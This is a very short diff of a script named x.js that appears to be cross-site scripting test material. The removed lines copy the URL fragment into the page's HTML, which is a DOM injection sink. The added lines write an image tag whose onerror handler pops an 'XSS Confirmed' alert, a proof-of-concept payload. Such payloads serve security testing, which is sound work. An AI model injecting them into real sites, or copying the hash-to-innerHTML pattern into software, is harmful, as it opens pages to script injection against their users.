@@ -1,2 +1,2 @@
-// x.js - hosted on your server
-document.body.innerHTML = location.hash;
+// x.js
+document.write('<img src=x onerror=alert("XSS Confirmed")>');
